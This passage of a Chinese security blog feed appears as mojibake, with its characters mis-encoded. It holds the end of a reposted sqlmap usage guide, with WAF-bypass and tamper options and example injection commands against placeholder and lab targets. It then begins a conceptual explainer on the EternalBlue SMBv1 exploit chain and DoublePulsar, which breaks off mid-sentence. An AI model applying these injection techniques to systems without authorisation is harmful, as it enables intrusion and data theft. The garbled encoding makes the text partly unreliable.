å¯ä»¥å°†å‘½ä»¤è¡Œé€‰é¡¹ä¿å­˜åˆ°é…ç½®INIæ–‡ä»¶ä¸­ã€‚ç„¶åï¼Œå¯ä»¥ä½¿ç”¨ä¹‹å‰è§£é‡Šçš„-cé€‰é¡¹ç¼–è¾‘ç”Ÿæˆçš„æ–‡ä»¶å¹¶å°†å…¶ä¼ é€’ç»™sqlmapã€‚</p><p>æ›´æ–°Sqlmap â€“update</p><h3 id="14-7-å¼ºåˆ¶è®¾ç½®-DBMS-ç¼–ç "><a href="#14-7-å¼ºåˆ¶è®¾ç½®-DBMS-ç¼–ç " class="headerlink" title="14.7 å¼ºåˆ¶è®¾ç½® DBMS ç¼–ç "></a>14.7 å¼ºåˆ¶è®¾ç½® DBMS ç¼–ç </h3><p>â€“encoding&#x3D;â€gbkâ€ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025767.png" alt="img"></p><h3 id="14-8-å­˜å‚¨-HTTP-æµé‡åˆ°-HAR"><a href="#14-8-å­˜å‚¨-HTTP-æµé‡åˆ°-HAR" class="headerlink" title="14.8 å­˜å‚¨ HTTP æµé‡åˆ° HAR"></a>14.8 å­˜å‚¨ HTTP æµé‡åˆ° HAR</h3><p>â€“har&#x3D;â€HARFILEâ€ HARï¼ˆHTTP Archiveï¼‰ï¼Œæ˜¯ä¸€ä¸ªç”¨æ¥å‚¨å­˜HTTPè¯·æ±‚&#x2F;å“åº”ä¿¡æ¯çš„é€šç”¨æ–‡ä»¶æ ¼å¼ï¼ŒåŸºäºJSONã€‚ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020937.png" alt="img"></p><h3 id="14-9-ç­›é€‰å…·ä½“-Payload"><a href="#14-9-ç­›é€‰å…·ä½“-Payload" class="headerlink" title="14.9 ç­›é€‰å…·ä½“ Payload"></a>14.9 ç­›é€‰å…·ä½“ Payload</h3><p>â€“test-filter&#x3D;â€ROWâ€ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025817.png" alt="img"></p><h3 id="14-10-è¿‡æ»¤å…·ä½“-Payload"><a href="#14-10-è¿‡æ»¤å…·ä½“-Payload" class="headerlink" title="14.10 è¿‡æ»¤å…·ä½“ Payload"></a>14.10 è¿‡æ»¤å…·ä½“ Payload</h3><p>â€“test-skip&#x3D;â€BENCHMARKâ€ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020843.png" alt="img"></p><p> <strong>è¡¥å……ï¼š</strong> é’ˆå¯¹proxyæ—¥å¿—æ–‡ä»¶ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ç­›é€‰ç›®æ ‡ â€“scope&#x3D;â€regexâ€</p><h2 id="0x0F-sqlmap-æ‚é¡¹å‚æ•°"><a href="#0x0F-sqlmap-æ‚é¡¹å‚æ•°" class="headerlink" title="0x0F sqlmap æ‚é¡¹å‚æ•°"></a>0x0F sqlmap æ‚é¡¹å‚æ•°</h2><h3 id="15-1-ä½¿ç”¨ç¼©å†™åŠ©è®°ç¬¦"><a href="#15-1-ä½¿ç”¨ç¼©å†™åŠ©è®°ç¬¦" class="headerlink" title="15.1 ä½¿ç”¨ç¼©å†™åŠ©è®°ç¬¦"></a>15.1 ä½¿ç”¨ç¼©å†™åŠ©è®°ç¬¦</h3><p>Sqlmapæä¾›çµæ´»çš„ç¼©å†™åŠ©è®°ç¬¦æ¥è¿›è¡Œå¿«é€Ÿä¹¦å†™å‘½ä»¤ã€‚ -z å‚æ•°</p><p>ä¾‹å¦‚ï¼š python sqlmap.py â€“batch â€“random-agent â€“ignore-proxy â€“technique&#x3D;BEU -u<a href="http://www.target.com/vuln.php?id=1%E2%80%B3">www.target.com/vuln.php?id=1â€³</a></p><p>ä½¿ç”¨åŠ©è®°ç¬¦ï¼š python sqlmap.py -z â€œbat,randoma,ign,tec&#x3D;BEUâ€ -u â€œ<a href="http://www.target.com/vuln.php?id=1%E2%80%9D">www.target.com/vuln.php?id=1â€</a></p><h3 id="15-2-è®¾ç½®æ¢æµ‹é¢„è­¦"><a href="#15-2-è®¾ç½®æ¢æµ‹é¢„è­¦" class="headerlink" title="15.2 è®¾ç½®æ¢æµ‹é¢„è­¦"></a>15.2 è®¾ç½®æ¢æµ‹é¢„è­¦</h3><p>åœ¨å‘ç°SQLæ³¨å…¥æ¼æ´æ—¶ï¼Œè¿è¡Œæœ¬æœºä¸»æœºç³»ç»Ÿå‘½ä»¤ â€“alert </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020505.png" alt="img"></p><h3 id="15-3-è®¾ç½®é—®é¢˜ç­”æ¡ˆ"><a href="#15-3-è®¾ç½®é—®é¢˜ç­”æ¡ˆ" class="headerlink" title="15.3 è®¾ç½®é—®é¢˜ç­”æ¡ˆ"></a>15.3 è®¾ç½®é—®é¢˜ç­”æ¡ˆ</h3><p>å¦‚æœç”¨æˆ·æƒ³è‡ªåŠ¨è®¾ç½®é—®é¢˜çš„ç­”æ¡ˆï¼Œå³ä½¿ä½¿ç”¨â€“batchï¼Œä½¿ç”¨â€“answersï¼Œé€šè¿‡åœ¨ç­‰å·åé¢æä¾›é—®é¢˜çš„ä»»ä½•éƒ¨åˆ†å’Œç­”æ¡ˆæ¥å®Œæˆã€‚å¦å¤–ï¼Œä¸åŒé—®é¢˜çš„ç­”æ¡ˆå¯ä»¥ç”¨åˆ†éš”ç¬¦åˆ†éš”ã€‚</p><p>ä¾‹å¦‚ï¼š python sqlmap.py -u â€œ<a href="http://192.168.22.128/sqlmap/mysql/get_int.php?id=1%E2%80%9D%E2%80%93technique=E">http://192.168.22.128/sqlmap/mysql/get_int.php?id=1â€â€“technique=E</a> â€“answers&#x3D;â€œextending&#x3D;Nâ€ â€“batch</p><h3 id="15-4-å‘ç°-SQL-æ³¨å…¥é¢„è­¦"><a href="#15-4-å‘ç°-SQL-æ³¨å…¥é¢„è­¦" class="headerlink" title="15.4 å‘ç° SQL æ³¨å…¥é¢„è­¦"></a>15.4 å‘ç° SQL æ³¨å…¥é¢„è­¦</h3><p>å¦‚æœç”¨æˆ·ä½¿ç”¨â€“beepï¼Œå½“å‘ç°SQLæ³¨å…¥æ—¶ï¼Œä¼šç«‹å³å‘å‡ºå“”å“”çš„è­¦å‘Šã€‚è¿™åœ¨éœ€è¦æµ‹è¯•çš„å¤§é‡ç›®æ ‡url(é€‰é¡¹-m)æ—¶ç‰¹åˆ«æœ‰ç”¨ã€‚</p><h3 id="15-5-å…¶ä»–"><a href="#15-5-å…¶ä»–" class="headerlink" title="15.5 å…¶ä»–"></a>15.5 å…¶ä»–</h3><p>â€“cleanup æ¸…é™¤DBMS udfåˆ›å»ºçš„æ•°æ®è¡¨ â€“dependencies æŸ¥çœ‹ä¾èµ–é¡¹ â€“disable-coloring ä¸è¿›è¡Œé«˜äº®æ˜¾ç¤º â€“identify-waf æŸ¥çœ‹æ˜¯å¦å…·æœ‰WAFä¿æŠ¤ â€“moblie ä½¿ç”¨æ‰‹æœºç«¯User-Agent â€“purge-output æ¸…é™¤outputç›®å½•ä¸‹çš„æ–‡ä»¶ â€“skip-waf ç»•è¿‡WAF â€“sqlmap-shell ä½¿ç”¨sqlmap shell â€“tmp-dir&#x3D;TMPDIR æŒ‡å®šæœ¬åœ°ç›®å½•ç”¨æ¥å­˜å‚¨ä¸´æ—¶æ–‡ä»¶ â€“web-root&#x3D;WEBROOT æŒ‡å®šç«™ç‚¹æ ¹ç›®å½• â€“wizard ä½¿ç”¨å‘å¯¼å¼çš„sqlmap â€“gpage&#x3D;GOOGLEPAGE è®¾ç½®Google Dorkçš„é¡µç æ•°</p><p>â€“smart æ™ºèƒ½æ¢æµ‹ æœ‰äº›æƒ…å†µä¸‹ï¼Œç”¨æˆ·æœ‰å¤§é‡çš„æ½œåœ¨ç›®æ ‡URLï¼ˆä¾‹å¦‚ï¼Œæä¾›äº†é€‰é¡¹ -mï¼‰ï¼Œå¸Œæœ›å°½å¿«æ‰¾åˆ°ä¸€ä¸ªè„†å¼±çš„ç›®æ ‡ã€‚å¦‚æœä½¿ç”¨â€”smartï¼Œé‚£ä¹ˆå°†åœ¨æ‰«æä¸­è¿›ä¸€æ­¥ä½¿ç”¨æ•°æ®åº“ç®¡ç†ç³»ç»Ÿé”™è¯¯çš„å‚æ•°ï¼Œå¦åˆ™å°±è·³è¿‡å®ƒä»¬</p><h2 id="0x10-å¸¸ç”¨-Tamper-è„šæœ¬"><a href="#0x10-å¸¸ç”¨-Tamper-è„šæœ¬" class="headerlink" title="0x10 å¸¸ç”¨ Tamper è„šæœ¬"></a>0x10 å¸¸ç”¨ Tamper è„šæœ¬</h2><p>è¿™é‡Œæ¨èå‡ ç¯‡æ¯”è¾ƒè¯¦ç»†çš„æ–‡ç« å»å­¦ä¹ ï¼š <a href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://www.cnblogs.com/mark0/p/12349551.html&objectId=2148285&objectType=1&contentType=undefined">https://www.cnblogs.com/mark0/p/12349551.html</a></p><p><a href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://blog.csdn.net/qq_34444097/article/details/82717357?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522159341834119725219951313%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=159341834119725219951313&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~pc_rank_v3-5-82717357.first_rank_ecpm_v1_pc_rank_v3&utm_term=sqlmap%20tamper%E8%84%9A%E6%9C%AC&objectId=2148285&objectType=1&contentType=undefined">https://blog.csdn.net/qq_34444097&#x2F;article&#x2F;details&#x2F;82717357?ops_request_misc&#x3D;%257B%2522request%255Fid%2522%253A%2522159341834119725219951313%2522%252C%2522scm%2522%253A%252220140713.130102334â€¦%2522%257D&amp;request_id&#x3D;159341834119725219951313&amp;biz_id&#x3D;0&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2allfirst_rank_ecpm_v1~pc_rank_v3-5-82717357.first_rank_ecpm_v1_pc_rank_v3&amp;utm_term&#x3D;sqlmap+tamperè„šæœ¬</a></p><blockquote><p> ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡å†…å®¹ç”±äº’è”ç½‘ç”¨æˆ·è‡ªå‘è´¡çŒ®ï¼Œè¯¥æ–‡è§‚ç‚¹ä»…ä»£è¡¨ä½œè€…æœ¬äººã€‚æœ¬ç«™ä»…æä¾›ä¿¡æ¯å­˜å‚¨ç©ºé—´æœåŠ¡ï¼Œä¸æ‹¥æœ‰æ‰€æœ‰æƒï¼Œä¸æ‰¿æ‹…ç›¸å…³æ³•å¾‹è´£ä»»ã€‚å¦‚å‘ç°æœ¬ç«™æœ‰æ¶‰å«Œä¾µæƒ&#x2F;è¿æ³•è¿è§„çš„å†…å®¹ï¼Œ è¯·å‘é€é‚®ä»¶è‡³ ä¸¾æŠ¥ï¼Œä¸€ç»æŸ¥å®ï¼Œæœ¬ç«™å°†ç«‹åˆ»åˆ é™¤ã€‚ </p><p>å‘å¸ƒè€…ï¼šå…¨æ ˆç¨‹åºå‘˜æ ˆé•¿ï¼Œè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼š<a href="https://javaforall.cn/200744.html%E5%8E%9F%E6%96%87%E9%93%BE%E6%8E%A5%EF%BC%9Ahttps://javaforall.cn">https://javaforall.cn/200744.htmlåŸæ–‡é“¾æ¥ï¼šhttps://javaforall.cn</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>æ¼æ´</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è½¬è½½</tag>
      
      <tag>sqlmapå‘½ä»¤è¯¦è§£</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ°¸æ’ä¹‹è“ å¤ç°</title>
    <link href="/2025/11/01/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%20%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/11/01/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%20%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="æ¦‚è¿°ï¼š"><a href="#æ¦‚è¿°ï¼š" class="headerlink" title="æ¦‚è¿°ï¼š"></a>æ¦‚è¿°ï¼š</h1><p>æ°¸æ’ä¹‹è“ï¼ˆè‹±è¯­ï¼šEternalBlueï¼‰æ˜¯ç¾å›½å›½å®¶å®‰å…¨å±€å¼€å‘çš„æ¼æ´åˆ©ç”¨ç¨‹åºï¼Œäº2017å¹´4æœˆ14æ—¥è¢«é»‘å®¢ç»„ç»‡å½±å­æ®å®¢æ³„æ¼ã€‚è¯¥å·¥å…·åˆ©ç”¨445&#x2F;TCPç«¯å£çš„æ–‡ä»¶åˆ†äº«åè®®çš„æ¼æ´è¿›è¡Œæ•£æ’­ã€‚</p><p>å°½ç®¡å¾®è½¯äº2017å¹´3æœˆ14æ—¥å·²å‘å¸ƒè¡¥ä¸ä¿®å¤è¯¥æ¼æ´ï¼Œä½†åœ¨5æœˆ12æ—¥WannaCryå‹’ç´¢è½¯ä»¶åˆ©ç”¨æ­¤æ¼æ´ä¼ æ’­æ—¶ï¼Œå¤§é‡æœªå®‰è£…è¡¥ä¸çš„ç”¨æˆ·ä»ç„¶å—å®³ã€‚</p><p>é‰´äºWannaCryçš„ä¸¥é‡æ€§ï¼Œå¾®è½¯ç½•è§åœ°ä¸ºå·²ç»ˆæ­¢æ”¯æŒçš„Windows XPã€Windows 8å’ŒWindows Server 2003å‘å¸ƒäº†ç´§æ€¥å®‰å…¨æ›´æ–°ã€‚</p><p>2017å¹´6æœˆ27æ—¥ï¼Œå‹’ç´¢è½¯ä»¶NotPetyaå†æ¬¡åˆ©ç”¨æ°¸æ’ä¹‹è“æ¼æ´åœ¨æ¬§æ´²ä¼ æ’­ã€‚ä¸æ™®é€šå‹’ç´¢è½¯ä»¶ä¸åŒï¼ŒNotPetyaä»¥ç ´åè€Œéå‹’ç´¢ä¸ºç›®çš„ï¼Œå³ä½¿æ”¯ä»˜èµé‡‘ä¹Ÿæ— æ³•æ¢å¤æ–‡ä»¶ã€‚çœŸæ­£çš„Petyaä½œè€…éšåå…¬å¸ƒäº†è§£å¯†å¯†é’¥ï¼Œå¹¶å£°æ˜ä¸æ­¤æ¬¡æ”»å‡»æ— å…³ã€‚</p><h1 id="åŸç†ï¼š"><a href="#åŸç†ï¼š" class="headerlink" title="åŸç†ï¼š"></a>åŸç†ï¼š</h1><p><strong><font style="color:rgb(15, 17, 21);">æ°¸æ’ä¹‹è“åˆ©ç”¨çš„æ˜¯Windowsç³»ç»Ÿæ–‡ä»¶å…±äº«åŠŸèƒ½ä¸­ä¸€ä¸ªä¸¥é‡çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ”»å‡»è€…æ— éœ€ç”¨æˆ·åå’Œå¯†ç ï¼Œåªè¦ç›®æ ‡æœºå™¨çš„445ç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œå°±å¯ä»¥é€šè¿‡ç½‘ç»œç›´æ¥å‘é€ä¸€æ®µç²¾å¿ƒæ„é€ çš„æ•°æ®åŒ…ï¼Œåœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚</font></strong></p><h2 id="æ ¸å¿ƒæ¼æ´ï¼šSMBv1-åè®®ä¸­çš„â€œç¼“å†²åŒºæº¢å‡ºâ€"><a href="#æ ¸å¿ƒæ¼æ´ï¼šSMBv1-åè®®ä¸­çš„â€œç¼“å†²åŒºæº¢å‡ºâ€" class="headerlink" title="æ ¸å¿ƒæ¼æ´ï¼šSMBv1 åè®®ä¸­çš„â€œç¼“å†²åŒºæº¢å‡ºâ€"></a><font style="color:rgb(15, 17, 21);">æ ¸å¿ƒæ¼æ´ï¼šSMBv1 åè®®ä¸­çš„â€œç¼“å†²åŒºæº¢å‡ºâ€</font></h2><p><font style="color:rgb(15, 17, 21);">æ°¸æ’ä¹‹è“æ”»å‡»çš„æ˜¯Windowsçš„</font><strong><font style="color:rgb(15, 17, 21);">SMBv1</font></strong><font style="color:rgb(15, 17, 21);"> æœåŠ¡å™¨æ¶ˆæ¯å—åè®®ã€‚è¿™ä¸ªåè®®ä¸»è¦ç”¨äºç½‘ç»œä¸Šçš„æ–‡ä»¶å…±äº«ã€æ‰“å°æœºå…±äº«ç­‰ã€‚æ¼æ´çš„æ ¸å¿ƒæ˜¯ä¸€ä¸ªç»å…¸çš„ </font><strong><font style="color:rgb(15, 17, 21);">ç¼“å†²åŒºæº¢å‡º</font></strong><font style="color:rgb(15, 17, 21);"> æ¼æ´ã€‚</font></p><ol><li><strong><font style="color:rgb(15, 17, 21);">ä»€ä¹ˆæ˜¯ç¼“å†²åŒºï¼Ÿ</font></strong><font style="color:rgb(15, 17, 21);"><br></font><font style="color:rgb(15, 17, 21);">æˆ‘ä»¬å¯ä»¥æŠŠç¼“å†²åŒºæƒ³è±¡æˆä¸€ä¸ªæœ‰å›ºå®šå®¹é‡çš„â€œå®¹å™¨â€æˆ–â€œè´§æ¶â€ï¼Œç”¨æ¥ä¸´æ—¶å­˜æ”¾ç¨‹åºå¤„ç†çš„æ•°æ®ã€‚</font></li><li><strong><font style="color:rgb(15, 17, 21);">æº¢å‡ºæ˜¯å¦‚ä½•å‘ç”Ÿçš„ï¼Ÿ</font></strong><font style="color:rgb(15, 17, 21);"><br></font><font style="color:rgb(15, 17, 21);">åœ¨SMBv1åè®®å¤„ç†ç‰¹å®šçš„SMBè¯·æ±‚ï¼ˆå°¤å…¶æ˜¯ä¸æ–‡ä»¶äº‹åŠ¡ç›¸å…³çš„</font><code>SMBv1 TRANS2</code><font style="color:rgb(15, 17, 21);">è¯·æ±‚ï¼‰æ—¶ï¼Œç¨‹åºæ²¡æœ‰æ­£ç¡®åœ°æ£€æŸ¥ç”¨æˆ·è¾“å…¥æ•°æ®çš„é•¿åº¦ã€‚</font><ul><li><font style="color:rgb(15, 17, 21);">æ”»å‡»è€…æ„é€ ä¸€ä¸ª</font><strong><font style="color:rgb(15, 17, 21);">è¶…é•¿</font></strong><font style="color:rgb(15, 17, 21);">çš„ã€</font><strong><font style="color:rgb(15, 17, 21);">ç•¸å½¢</font></strong><font style="color:rgb(15, 17, 21);">çš„æ•°æ®åŒ…ã€‚</font></li><li>å½“Windowsç³»ç»Ÿæ”¶åˆ°è¿™ä¸ªæ•°æ®åŒ…æ—¶ï¼Œä¼šæŒ‰ç…§SMBåè®®å»è§£æå®ƒã€‚</li><li><font style="color:rgb(15, 17, 21);">ç”±äºæ²¡æœ‰è¿›è¡Œé•¿åº¦æ ¡éªŒï¼Œè¿™ä¸ªè¶…é•¿çš„æ•°æ®ä¼šâ€œæ’‘çˆ†â€ç³»ç»Ÿé¢„å…ˆåˆ†é…å¥½çš„é‚£ä¸ªâ€œç¼“å†²åŒºâ€ï¼Œå¯¼è‡´å¤šå‡ºæ¥çš„æ•°æ®è¦†ç›–åˆ°æ—è¾¹å†…å­˜åŒºåŸŸã€‚</font></li></ul></li></ol><h2 id="å…³é”®æ­¥éª¤ï¼šä»æº¢å‡ºåˆ°æ§åˆ¶"><a href="#å…³é”®æ­¥éª¤ï¼šä»æº¢å‡ºåˆ°æ§åˆ¶" class="headerlink" title="å…³é”®æ­¥éª¤ï¼šä»æº¢å‡ºåˆ°æ§åˆ¶"></a><font style="color:rgb(15, 17, 21);">å…³é”®æ­¥éª¤ï¼šä»æº¢å‡ºåˆ°æ§åˆ¶</font></h2><p><font style="color:rgb(15, 17, 21);">ä»…ä»…è®©ç¨‹åºå´©æºƒï¼ˆé€ æˆè“å±ï¼‰ä¸æ˜¯æ”»å‡»è€…çš„ç›®çš„ï¼Œä»–ä»¬çš„ç›®æ ‡æ˜¯</font><strong><font style="color:rgb(15, 17, 21);">æ§åˆ¶</font></strong><font style="color:rgb(15, 17, 21);">ä½ çš„ç”µè„‘ã€‚æ°¸æ’ä¹‹è“é€šè¿‡ä»¥ä¸‹ç²¾å¦™çš„æ­¥éª¤å®ç°äº†è¿™ä¸€ç‚¹ï¼š</font></p><ol><li><strong><font style="color:rgb(15, 17, 21);">è¦†ç›–å…³é”®æ•°æ®ï¼ŒåŠ«æŒç¨‹åºæµç¨‹ï¼š</font></strong><font style="color:rgb(15, 17, 21);"><br></font><font style="color:rgb(15, 17, 21);">è¢«â€œæ’‘çˆ†â€çš„ç¼“å†²åŒºæ—è¾¹çš„å†…å­˜åŒºåŸŸï¼Œå­˜æ”¾ç€ä¸€äº›å…³é”®æ•°æ®ï¼Œæ¯”å¦‚</font><strong><font style="color:rgb(15, 17, 21);">å‡½æ•°è¿”å›åœ°å€</font></strong><font style="color:rgb(15, 17, 21);">ã€‚æ”»å‡»è€…ç²¾å¿ƒè®¾è®¡æº¢å‡ºæ•°æ®ï¼Œç”¨ä»–ä»¬æŒ‡å®šçš„ä¸€ä¸ªå†…å­˜åœ°å€å»è¦†ç›–è¿™ä¸ªè¿”å›åœ°å€ã€‚</font></li><li><strong><font style="color:rgb(15, 17, 21);">åˆ©ç”¨â€œShellcodeâ€æ‰§è¡Œå‘½ä»¤ï¼š</font></strong><font style="color:rgb(15, 17, 21);"><br></font><font style="color:rgb(15, 17, 21);">åœ¨æº¢å‡ºçš„æ•°æ®ä¸­ï¼Œæ”»å‡»è€…ä¼šåµŒå…¥ä¸€å°æ®µæ¶æ„ä»£ç ï¼Œç§°ä¸º</font><font style="color:rgb(15, 17, 21);"> </font><strong><font style="color:rgb(15, 17, 21);">â€œShellcodeâ€</font></strong><font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">ã€‚è¿™æ®µä»£ç çš„åŠŸèƒ½é€šå¸¸æ˜¯ï¼š</font><strong><font style="color:rgb(15, 17, 21);">ä¸‹è½½å¹¶æ‰§è¡Œå‹’ç´¢è½¯ä»¶ï¼ˆå¦‚WannaCryï¼‰çš„åç«¯è´Ÿè½½ï¼Œæˆ–è€…åœ¨ç³»ç»Ÿä¸Šå¼€ä¸€ä¸ªå…·æœ‰é«˜æƒé™çš„åé—¨</font></strong><font style="color:rgb(15, 17, 21);">ã€‚</font></li><li><strong><font style="color:rgb(15, 17, 21);">è§¦å‘æ¼æ´ï¼Œè·³è½¬åˆ°æ”»å‡»ä»£ç ï¼š</font></strong><font style="color:rgb(15, 17, 21);"><br></font><font style="color:rgb(15, 17, 21);">å½“è¢«æ”»å‡»çš„ç¨‹åºï¼ˆSMBæœåŠ¡ï¼‰å¤„ç†å®Œè¿™ä¸ªç•¸å½¢æ•°æ®åŒ…ï¼Œå‡†å¤‡è¿”å›æ—¶ï¼Œå®ƒä¼šå»è¯»å–é‚£ä¸ªè¢«è¦†ç›–çš„â€œè¿”å›åœ°å€â€ã€‚è¿™ä¸ªåœ°å€ç°åœ¨æŒ‡å‘çš„æ˜¯æ”»å‡»è€…å®‰æ’çš„ä½ç½®ã€‚</font></li><li><strong><font style="color:rgb(15, 17, 21);">å†…æ ¸æ€æƒé™æå‡ï¼š</font></strong><font style="color:rgb(15, 17, 21);"><br></font><font style="color:rgb(15, 17, 21);">è¿™é‡Œæ˜¯æœ€ç²¾å¦™ä¹Ÿæœ€å±é™©çš„ä¸€æ­¥ã€‚æ°¸æ’ä¹‹è“åˆ©ç”¨äº†ä¸€ä¸ªåä¸º</font><font style="color:rgb(15, 17, 21);"> </font><strong><font style="color:rgb(15, 17, 21);">â€œDoublePulsarâ€</font></strong><font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">çš„åé—¨ã€‚åœ¨æº¢å‡ºå‘ç”Ÿåï¼ŒShellcodeå¹¶ä¸ä¼šç›´æ¥åœ¨ç”¨æˆ·æƒé™ä¸‹è¿è¡Œï¼Œè€Œæ˜¯åˆ©ç”¨Windowså†…æ ¸ä¸­çš„ä¸€ä¸ªæœºåˆ¶ï¼Œå°†æ‰§è¡Œæµç¨‹åˆ‡æ¢åˆ°</font><strong><font style="color:rgb(15, 17, 21);">å†…æ ¸æ¨¡å¼</font></strong><font style="color:rgb(15, 17, 21);">ã€‚</font><ul><li><strong><font style="color:rgb(15, 17, 21);">ç”¨æˆ·æ¨¡å¼</font></strong><font style="color:rgb(15, 17, 21);">ï¼šæ™®é€šç¨‹åºçš„è¿è¡Œçº§åˆ«ï¼Œæƒé™å—é™ã€‚</font></li><li><strong><font style="color:rgb(15, 17, 21);">å†…æ ¸æ¨¡å¼</font></strong><font style="color:rgb(15, 17, 21);">ï¼šæ“ä½œç³»ç»Ÿçš„æ ¸å¿ƒè¿è¡Œçº§åˆ«ï¼Œæ‹¥æœ‰å¯¹ç³»ç»Ÿçš„å®Œå…¨æ§åˆ¶æƒã€‚</font><font style="color:rgb(15, 17, 21);"><br></font><font style="color:rgb(15, 17, 21);">é€šè¿‡ä¸€ä¸ªç²¾å¿ƒæ„é€ çš„â€œä»»æ„å†™å…¥â€åŸè¯­ï¼Œæ”»å‡»è€…å¯ä»¥å°†è‡ªå·±çš„Shellcodeæ³¨å…¥åˆ°å†…æ ¸ç©ºé—´ï¼Œå¹¶æå‡å…¶æƒé™ï¼Œä½¿å…¶ä»¥</font><strong><font style="color:rgb(15, 17, 21);">ç³»ç»Ÿæœ€é«˜æƒé™</font></strong><font style="color:rgb(15, 17, 21);">æ‰§è¡Œã€‚</font></li></ul></li></ol><h2 id="æ”»å‡»æµç¨‹æ€»ç»“"><a href="#æ”»å‡»æµç¨‹æ€»ç»“" class="headerlink" title="æ”»å‡»æµç¨‹æ€»ç»“"></a><font style="color:rgb(15, 17, 21);">æ”»å‡»æµç¨‹æ€»ç»“</font></h2><p><font style="color:rgb(15, 17, 21);">ä¸€ä¸ªå®Œæ•´çš„æ°¸æ’ä¹‹è“æ”»å‡»å¯ä»¥æ¦‚æ‹¬ä¸ºä»¥ä¸‹å‡ æ­¥ï¼š</font></p><ol><li><strong><font style="color:rgb(15, 17, 21);">æ‰«æ</font></strong><font style="color:rgb(15, 17, 21);">ï¼šæ”»å‡»è€…åœ¨ç½‘ç»œä¸Šæ‰«æå¼€æ”¾äº†</font><strong><font style="color:rgb(15, 17, 21);">445ç«¯å£</font></strong><font style="color:rgb(15, 17, 21);">çš„Windowsæœºå™¨ã€‚</font></li><li><strong><font style="color:rgb(15, 17, 21);">å‘é€æ¶æ„åŒ…</font></strong><font style="color:rgb(15, 17, 21);">ï¼šå‘ç›®æ ‡æœºå™¨çš„445ç«¯å£å‘é€åˆ©ç”¨SMBv1ç¼“å†²åŒºæº¢å‡ºæ¼æ´çš„ç²¾å¿ƒæ„é€ çš„æ•°æ®åŒ…ã€‚</font></li><li><strong><font style="color:rgb(15, 17, 21);">è§¦å‘æº¢å‡º</font></strong><font style="color:rgb(15, 17, 21);">ï¼šç›®æ ‡ç³»ç»Ÿçš„SMBæœåŠ¡å¤„ç†è¯¥æ•°æ®åŒ…ï¼Œå‘ç”Ÿç¼“å†²åŒºæº¢å‡ºï¼Œå…³é”®å†…å­˜åœ°å€è¢«è¦†ç›–ã€‚</font></li><li><strong><font style="color:rgb(15, 17, 21);">å†…æ ¸ææƒ</font></strong><font style="color:rgb(15, 17, 21);">ï¼šåˆ©ç”¨DoublePulsaræŠ€æœ¯ï¼Œå°†æ¶æ„Shellcodeæ³¨å…¥å†…æ ¸å¹¶æå‡è‡³ç³»ç»Ÿæƒé™ã€‚</font></li><li><strong><font style="color:rgb(15, 17, 21);">æ‰§è¡Œè½½è·</font></strong><font style="color:rgb(15, 17, 21);">ï¼šåœ¨å†…æ ¸æ€æ‰§è¡ŒShellcodeï¼Œé€šå¸¸ä¼šä»æ”»å‡»è€…æ§åˆ¶çš„æœåŠ¡å™¨ä¸‹è½½å¹¶è¿è¡Œæœ€ç»ˆçš„æ¶æ„è½¯ä»¶ï¼ˆå¦‚WannaCryå‹’ç´¢ç—…æ¯’ï¼‰ã€‚</font></li><li><strong><font style="color:rgb(15, 17, 21);">æ¨ªå‘ç§»åŠ¨</font></strong><font style="color:rgb(15, 17, 21);">ï¼šè¢«æ”»é™·çš„æœºå™¨ä¼šå˜æˆä¸€ä¸ªè·³æ¿ï¼Œç»§ç»­åœ¨å†…éƒ¨ç½‘ç»œä¸­æ‰«æå’Œæ”»å‡»å…¶ä»–å­˜åœ¨æ¼æ´çš„æœºå™¨ï¼Œå½¢æˆé“¾å¼ååº”ï¼Œè¿™ä¹Ÿæ˜¯WannaCryèƒ½è¿…é€Ÿè”“å»¶å…¨çƒçš„åŸå› ã€‚</font></li></ol><h2 id="å±å®³"><a href="#å±å®³" class="headerlink" title="å±å®³"></a><font style="color:rgb(15, 17, 21);">å±å®³</font></h2><ul><li><strong><font style="color:rgb(15, 17, 21);">æ— éœ€ç”¨æˆ·äº¤äº’</font></strong><font style="color:rgb(15, 17, 21);">ï¼šç”¨æˆ·ä¸éœ€è¦ç‚¹å‡»ä»»ä½•é“¾æ¥æˆ–æ‰“å¼€ä»»ä½•æ–‡ä»¶ï¼Œåªè¦ç”µè„‘å¼€æœºå¹¶è”ç½‘ï¼Œå°±å¯èƒ½è¢«æ”»å‡»ã€‚</font></li><li><strong><font style="color:rgb(15, 17, 21);">é«˜æƒé™</font></strong><font style="color:rgb(15, 17, 21);">ï¼šç›´æ¥è·å–ç³»ç»Ÿå†…æ ¸æƒé™ï¼Œå¯ä»¥ä¸ºæ‰€æ¬²ä¸ºã€‚</font></li><li><strong><font style="color:rgb(15, 17, 21);">è •è™«å¼ä¼ æ’­</font></strong><font style="color:rgb(15, 17, 21);">ï¼šç»“åˆäº†æ¼æ´åˆ©ç”¨å’Œè 